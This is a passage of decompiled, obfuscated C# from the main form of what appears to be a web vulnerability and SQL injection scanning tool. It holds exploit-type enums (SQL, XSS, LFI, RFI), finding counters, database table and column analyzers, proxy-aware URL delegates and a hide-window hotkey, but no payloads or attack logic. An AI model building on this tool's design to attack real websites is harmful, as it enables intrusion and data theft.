	// Token: 0x04000775 RID: 1909
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	private static string string_1;

	// Token: 0x04000776 RID: 1910
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	private static string string_2;

	// Token: 0x04000777 RID: 1911
	private Dictionary<string, Delegate> dictionary_1;

	// Token: 0x04000778 RID: 1912
	private static string string_3 = "";

	// Token: 0x04000779 RID: 1913
	private string string_4;

	// Token: 0x0400077A RID: 1914
	private static int int_5;

	// Token: 0x0400077B RID: 1915
	private static int int_6;

	// Token: 0x0400077C RID: 1916
	private static int int_7;

	// Token: 0x0400077D RID: 1917
	private static int int_8;

	// Token: 0x0400077E RID: 1918
	private static int int_9;

	// Token: 0x0400077F RID: 1919
	private static int int_10;

	// Token: 0x04000780 RID: 1920
	private static int int_11;

	// Token: 0x04000781 RID: 1921
	private static int int_12;

	// Token: 0x04000782 RID: 1922
	private static int int_13;

	// Token: 0x04000783 RID: 1923
	private MainForm.Struct10 struct10_0;

	// Token: 0x04000784 RID: 1924
	private MainForm.CheckSearchType checkSearchType_0;

	// Token: 0x04000785 RID: 1925
	private SearchColumn searchColumn_0;

	// Token: 0x04000786 RID: 1926
	private List<DataGridViewRow> list_2;

	// Token: 0x04000787 RID: 1927
	internal TreeNode treeNode_0;

	// Token: 0x04000788 RID: 1928
	internal TreeNode treeNode_1;

	// Token: 0x04000789 RID: 1929
	internal TreeNode treeNode_2;

	// Token: 0x0400078A RID: 1930
	internal TreeNode treeNode_3;

	// Token: 0x0400078B RID: 1931
	internal TreeNode treeNode_4;

	// Token: 0x0400078C RID: 1932
	internal TreeNode treeNode_5;

	// Token: 0x0400078D RID: 1933
	internal TreeNode treeNode_6;

	// Token: 0x0400078E RID: 1934
	internal TreeNode treeNode_7;

	// Token: 0x0400078F RID: 1935
	internal TreeNode treeNode_8;

	// Token: 0x04000790 RID: 1936
	internal TreeNode treeNode_9;

	// Token: 0x04000791 RID: 1937
	internal TreeNode treeNode_10;

	// Token: 0x04000792 RID: 1938
	internal TreeNode treeNode_11;

	// Token: 0x04000793 RID: 1939
	internal TreeNode treeNode_12;

	// Token: 0x04000794 RID: 1940
	internal TreeNode treeNode_13;

	// Token: 0x04000795 RID: 1941
	internal TreeNode treeNode_14;

	// Token: 0x04000796 RID: 1942
	internal TreeNode treeNode_15;

	// Token: 0x04000797 RID: 1943
	internal ToolStripLabel toolStripLabel_1;

	// Token: 0x04000798 RID: 1944
	internal ToolStripButton toolStripButton_3;

	// Token: 0x04000799 RID: 1945
	internal ToolStripButton toolStripButton_4;

	// Token: 0x0400079A RID: 1946
	private System.Timers.Timer timer_0;

	// Token: 0x0400079B RID: 1947
	private System.Timers.Timer timer_1;

	// Token: 0x0400079C RID: 1948
	private UxTabControl uxTabControl_0;

	// Token: 0x0400079D RID: 1949
	private UxTabControl uxTabControl_1;

	// Token: 0x0400079E RID: 1950
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	[AccessedThroughProperty("mdiTabControl")]
	private TabControlExt tabControlExt_0;

	// Token: 0x0400079F RID: 1951
	private ScrollingBox scrollingBox_0;

	// Token: 0x040007A0 RID: 1952
	private bool bool_4;

	// Token: 0x040007A1 RID: 1953
	private Stopwatch stopwatch_0;

	// Token: 0x040007A2 RID: 1954
	private bool $STATIC$Main_FormClosing$20211C128375$IsCalled;

	// Token: 0x040007A3 RID: 1955
	private StaticLocalInitFlag $STATIC$Main_FormClosing$20211C128375$IsCalled$Init;

	// Token: 0x040007A4 RID: 1956
	private bool $STATIC$PausedOrCanceled$2002$bPauseControl;

	// Token: 0x040007A5 RID: 1957
	private StaticLocalInitFlag $STATIC$PausedOrCanceled$2002$bPauseControl$Init;

	// Token: 0x040007A6 RID: 1958
	private bool $STATIC$bcWorker_ProgressChanged$20211C12832D$IsLoaded;

	// Token: 0x040007A7 RID: 1959
	private Dictionary<string, List<string>> $STATIC$AnalizerCheckColumn$201E1283BC$cDBS;

	// Token: 0x040007A8 RID: 1960
	private StaticLocalInitFlag $STATIC$AnalizerCheckColumn$201E1283BC$cDBS$Init;

	// Token: 0x040007A9 RID: 1961
	private Dictionary<string, List<string>> $STATIC$AnalizerCheckTable$201E1283BC$cDBS;

	// Token: 0x040007AA RID: 1962
	private StaticLocalInitFlag $STATIC$AnalizerCheckTable$201E1283BC$cDBS$Init;

	// Token: 0x040007AB RID: 1963
	private int $STATIC$HandleTimerBackground$20211C12819D$Tricks;

	// Token: 0x040007AC RID: 1964
	private StaticLocalInitFlag $STATIC$HandleTimerBackground$20211C12819D$Tricks$Init;

	// Token: 0x040007AD RID: 1965
	private int $STATIC$HandleTimerBackground$20211C12819D$called_tricks;

	// Token: 0x040007AE RID: 1966
	private StaticLocalInitFlag $STATIC$HandleTimerBackground$20211C12819D$called_tricks$Init;

	// Token: 0x040007AF RID: 1967
	private bool $STATIC$HandleTimerBackground$20211C12819D$called;

	// Token: 0x040007B0 RID: 1968
	private byte $STATIC$cmbSkin_SelectedIndexChanged$20211C12819D$SkinState;

	// Token: 0x040007B1 RID: 1969
	private StaticLocalInitFlag $STATIC$cmbSkin_SelectedIndexChanged$20211C12819D$SkinState$Init;

	// Token: 0x040007B2 RID: 1970
	private int $STATIC$cmbSkin_SelectedIndexChanged$20211C12819D$LastIndex;

	// Token: 0x040007B3 RID: 1971
	private StaticLocalInitFlag $STATIC$cmbSkin_SelectedIndexChanged$20211C12819D$LastIndex$Init;

	// Token: 0x040007B4 RID: 1972
	private int $STATIC$AddLog$202AEE$iCount;

	// Token: 0x040007B5 RID: 1973
	private StaticLocalInitFlag $STATIC$AddLog$202AEE$iCount$Init;

	// Token: 0x040007B6 RID: 1974
	private int $STATIC$AddLog$202AEE$iSkiped;

	// Token: 0x040007B7 RID: 1975
	private StaticLocalInitFlag $STATIC$AddLog$202AEE$iSkiped$Init;

	// Token: 0x020000D2 RID: 210
	internal enum Enum6
	{
		// Token: 0x040007B9 RID: 1977
		const_0,
		// Token: 0x040007BA RID: 1978
		const_1,
		// Token: 0x040007BB RID: 1979
		const_2,
		// Token: 0x040007BC RID: 1980
		const_3,
		// Token: 0x040007BD RID: 1981
		const_4,
		// Token: 0x040007BE RID: 1982
		const_5
	}

	// Token: 0x020000D3 RID: 211
	internal enum ExploitType
	{
		// Token: 0x040007C0 RID: 1984
		SQL,
		// Token: 0x040007C1 RID: 1985
		XSS,
		// Token: 0x040007C2 RID: 1986
		LFI,
		// Token: 0x040007C3 RID: 1987
		RFI
	}

	// Token: 0x020000D4 RID: 212
	// (Invoke) Token: 0x06000F95 RID: 3989
	private delegate void Delegate44(string sDesc);

	// Token: 0x020000D5 RID: 213
	// (Invoke) Token: 0x06000F99 RID: 3993
	private delegate bool Delegate45();

	// Token: 0x020000D6 RID: 214
	private struct Struct9
	{
		// Token: 0x040007C4 RID: 1988
		public IntPtr intptr_0;

		// Token: 0x040007C5 RID: 1989
		public IntPtr intptr_1;

		// Token: 0x040007C6 RID: 1990
		public int int_0;

		// Token: 0x040007C7 RID: 1991
		public int int_1;

		// Token: 0x040007C8 RID: 1992
		public int int_2;

		// Token: 0x040007C9 RID: 1993
		public int int_3;

		// Token: 0x040007CA RID: 1994
		public int int_4;
	}

	// Token: 0x020000D7 RID: 215
	private sealed class Class48
	{
		// Token: 0x06000F9B RID: 3995
		[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
		private static extern int RegisterHotKey(IntPtr intptr_0, int int_1, int int_2, int int_3);

		// Token: 0x06000F9C RID: 3996
		[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
		private static extern int UnregisterHotKey(IntPtr intptr_0, int int_1);

		// Token: 0x06000F9D RID: 3997 RVA: 0x000088A3 File Offset: 0x00006AA3
		public static void smethod_0(ref Form form_0, string string_0, MainForm.Class48.Enum7 enum7_0)
		{
			MainForm.Class48.RegisterHotKey(form_0.Handle, 1, (int)enum7_0, Strings.Asc(string_0.ToUpper()));
		}

		// Token: 0x06000F9E RID: 3998 RVA: 0x000088BF File Offset: 0x00006ABF
		public static void smethod_1(ref Form form_0)
		{
			MainForm.Class48.UnregisterHotKey(form_0.Handle, 1);
		}

		// Token: 0x06000F9F RID: 3999 RVA: 0x000088CF File Offset: 0x00006ACF
		public static void smethod_2(IntPtr intptr_0)
		{
			if (global::Globals.GMain.chkGUIHotKey.Checked)
			{
				if (global::Globals.GMain.Visible)
				{
					global::Globals.GMain.Hide();
				}
				else
				{
					global::Globals.GMain.Show();
				}
			}
		}

		// Token: 0x040007CB RID: 1995
		public static int int_0;

		// Token: 0x020000D8 RID: 216
		public enum Enum7
		{
			// Token: 0x040007CD RID: 1997
			const_0,
			// Token: 0x040007CE RID: 1998
			const_1,
			// Token: 0x040007CF RID: 1999
			const_2,
			// Token: 0x040007D0 RID: 2000
			const_3 = 4,
			// Token: 0x040007D1 RID: 2001
			const_4 = 8
		}
	}

	// Token: 0x020000D9 RID: 217
	// (Invoke) Token: 0x06000FA3 RID: 4003
	private delegate object Delegate46();

	// Token: 0x020000DA RID: 218
	// (Invoke) Token: 0x06000FA7 RID: 4007
	private delegate void Delegate47(ProgressBarStyle p);

	// Token: 0x020000DB RID: 219
	// (Invoke) Token: 0x06000FAB RID: 4011
	private delegate void Delegate48();

	// Token: 0x020000DC RID: 220
	private struct Struct10
	{
		// Token: 0x06000FAC RID: 4012 RVA: 0x0006CD1C File Offset: 0x0006AF1C
		public string method_0()
		{
			System.Text.StringBuilder stringBuilder = new System.Text.StringBuilder();
			this.method_1(this.int_3, "SQLi: ", ref stringBuilder);
			this.method_1(0, "SQLn: ", ref stringBuilder);
			this.method_1(this.int_0, "LFI: ", ref stringBuilder);
			this.method_1(this.int_1, "RFI: ", ref stringBuilder);
			this.method_1(this.int_2, "XSS: ", ref stringBuilder);
			if (string.IsNullOrEmpty(stringBuilder.ToString()))
			{
				stringBuilder.Append("0");
			}
			return stringBuilder.ToString();
		}

		// Token: 0x06000FAD RID: 4013 RVA: 0x00008904 File Offset: 0x00006B04
		private void method_1(int int_5, string string_0, ref System.Text.StringBuilder stringBuilder_0)
		{
			if (int_5 > 0)
			{
				if (!string.IsNullOrEmpty(stringBuilder_0.ToString()))
				{
					stringBuilder_0.Append(", ");
				}
				stringBuilder_0.Append(string_0 + global::Globals.FormatNumbers(int_5, false));
			}
		}

		// Token: 0x040007D2 RID: 2002
		public int int_0;

		// Token: 0x040007D3 RID: 2003
		public int int_1;

		// Token: 0x040007D4 RID: 2004
		public int int_2;

		// Token: 0x040007D5 RID: 2005
		public int int_3;

		// Token: 0x040007D6 RID: 2006
		public int int_4;
	}

	// Token: 0x020000DD RID: 221
	private enum CheckSearchType
	{
		// Token: 0x040007D8 RID: 2008
		Columns,
		// Token: 0x040007D9 RID: 2009
		Tables
	}

	// Token: 0x020000DE RID: 222
	// (Invoke) Token: 0x06000FB1 RID: 4017
	private delegate void Delegate49();

	// Token: 0x020000DF RID: 223
	private sealed class Class49
	{
		// Token: 0x06000FB2 RID: 4018 RVA: 0x0000893F File Offset: 0x00006B3F
		public Class49()
		{
			this.AllResults = true;
		}

		// Token: 0x170004EC RID: 1260
		// (get) Token: 0x06000FB3 RID: 4019 RVA: 0x0000894E File Offset: 0x00006B4E
		// (set) Token: 0x06000FB4 RID: 4020 RVA: 0x00008956 File Offset: 0x00006B56
		public int Int32_0 { get; set; }

		// Token: 0x170004ED RID: 1261
		// (get) Token: 0x06000FB5 RID: 4021 RVA: 0x0000895F File Offset: 0x00006B5F
		// (set) Token: 0x06000FB6 RID: 4022 RVA: 0x00008967 File Offset: 0x00006B67
		public Thread Thread { get; set; }

		// Token: 0x170004EE RID: 1262
		// (get) Token: 0x06000FB7 RID: 4023 RVA: 0x00008970 File Offset: 0x00006B70
		// (set) Token: 0x06000FB8 RID: 4024 RVA: 0x00008978 File Offset: 0x00006B78
		public DataGridViewRow Item { get; set; }

		// Token: 0x170004EF RID: 1263
		// (get) Token: 0x06000FB9 RID: 4025 RVA: 0x00008981 File Offset: 0x00006B81
		// (set) Token: 0x06000FBA RID: 4026 RVA: 0x00008989 File Offset: 0x00006B89
		public string String_0 { get; set; }

		// Token: 0x170004F0 RID: 1264
		// (get) Token: 0x06000FBB RID: 4027 RVA: 0x00008992 File Offset: 0x00006B92
		// (set) Token: 0x06000FBC RID: 4028 RVA: 0x0000899A File Offset: 0x00006B9A
		public int Retry { get; set; }

		// Token: 0x170004F1 RID: 1265
		// (get) Token: 0x06000FBD RID: 4029 RVA: 0x000089A3 File Offset: 0x00006BA3
		// (set) Token: 0x06000FBE RID: 4030 RVA: 0x000089AB File Offset: 0x00006BAB
		public Analyzer o { get; set; }

		// Token: 0x170004F2 RID: 1266
		// (get) Token: 0x06000FBF RID: 4031 RVA: 0x000089B4 File Offset: 0x00006BB4
		// (set) Token: 0x06000FC0 RID: 4032 RVA: 0x000089BC File Offset: 0x00006BBC
		public bool CurrentDB { get; set; }

		// Token: 0x170004F3 RID: 1267
		// (get) Token: 0x06000FC1 RID: 4033 RVA: 0x000089C5 File Offset: 0x00006BC5
		// (set) Token: 0x06000FC2 RID: 4034 RVA: 0x000089CD File Offset: 0x00006BCD
		public string Search { get; set; }

		// Token: 0x170004F4 RID: 1268
		// (get) Token: 0x06000FC3 RID: 4035 RVA: 0x000089D6 File Offset: 0x00006BD6
		// (set) Token: 0x06000FC4 RID: 4036 RVA: 0x000089DE File Offset: 0x00006BDE
		public MainForm.CheckSearchType SearchType { get; set; }

		// Token: 0x170004F5 RID: 1269
		// (get) Token: 0x06000FC5 RID: 4037 RVA: 0x000089E7 File Offset: 0x00006BE7
		// (set) Token: 0x06000FC6 RID: 4038 RVA: 0x000089EF File Offset: 0x00006BEF
		public int Count { get; set; }

		// Token: 0x170004F6 RID: 1270
		// (get) Token: 0x06000FC7 RID: 4039 RVA: 0x000089F8 File Offset: 0x00006BF8
		// (set) Token: 0x06000FC8 RID: 4040 RVA: 0x00008A00 File Offset: 0x00006C00
		public bool AllResults { get; set; }

		// Token: 0x040007DA RID: 2010
		[CompilerGenerated]
		[DebuggerBrowsable(DebuggerBrowsableState.Never)]
		private int int_0;

		// Token: 0x040007DB RID: 2011
		[CompilerGenerated]
		[DebuggerBrowsable(DebuggerBrowsableState.Never)]
		private Thread thread_0;

		// Token: 0x040007DC RID: 2012
		[CompilerGenerated]
		[DebuggerBrowsable(DebuggerBrowsableState.Never)]
		private DataGridViewRow dataGridViewRow_0;

		// Token: 0x040007DD RID: 2013
		[CompilerGenerated]
		[DebuggerBrowsable(DebuggerBrowsableState.Never)]
		private string string_0;

		// Token: 0x040007DE RID: 2014
		[DebuggerBrowsable(DebuggerBrowsableState.Never)]
		[CompilerGenerated]
		private int int_1;

		// Token: 0x040007DF RID: 2015
		[DebuggerBrowsable(DebuggerBrowsableState.Never)]
		[CompilerGenerated]
		private Analyzer analyzer_0;

		// Token: 0x040007E0 RID: 2016
		[CompilerGenerated]
		[DebuggerBrowsable(DebuggerBrowsableState.Never)]
		private bool bool_0;

		// Token: 0x040007E1 RID: 2017
		[CompilerGenerated]
		[DebuggerBrowsable(DebuggerBrowsableState.Never)]
		private string string_1;

		// Token: 0x040007E2 RID: 2018
		[DebuggerBrowsable(DebuggerBrowsableState.Never)]
		[CompilerGenerated]
		private MainForm.CheckSearchType checkSearchType_0;

		// Token: 0x040007E3 RID: 2019
		[CompilerGenerated]
		[DebuggerBrowsable(DebuggerBrowsableState.Never)]
		private int int_2;

		// Token: 0x040007E4 RID: 2020
		[DebuggerBrowsable(DebuggerBrowsableState.Never)]
		[CompilerGenerated]
		private bool bool_1;
	}

	// Token: 0x020000E0 RID: 224
	// (Invoke) Token: 0x06000FCC RID: 4044
	private delegate void Delegate50(object sender, DoWorkEventArgs e);

	// Token: 0x020000E1 RID: 225
	// (Invoke) Token: 0x06000FD0 RID: 4048
	private delegate long Delegate51(string sURL, string sProxy);

	// Token: 0x020000E2 RID: 226
	// (Invoke) Token: 0x06000FD4 RID: 4052
	private delegate void Delegate52(long long_0, string sURL, string sSize, string sReponse, string sStatus, string sLog);
}
